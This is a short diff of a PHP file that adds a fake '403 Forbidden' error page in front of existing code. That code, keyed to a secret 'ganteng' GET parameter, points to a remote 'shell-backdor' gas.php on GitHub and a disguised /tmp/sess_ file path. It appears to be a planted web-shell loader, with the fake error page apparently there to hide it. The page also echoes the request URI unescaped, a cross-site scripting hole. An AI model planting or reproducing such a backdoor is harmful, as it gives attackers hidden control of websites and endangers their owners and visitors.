@@ -1,3 +1,12 @@
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>403 Forbidden</title>
+</head><body>
+<h1>403 Forbidden</h1>
+<p>The requested URL <?php echo $_SERVER['REQUEST_URI'];
+ ?> was not found on this server.</p>
+</body></html>
+
 <?php
 if(isset($_GET["ganteng"]))
 $data = ['https://raw.githubusercontent.com/mrkronkz/shell-backdor/master/gas.php', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];
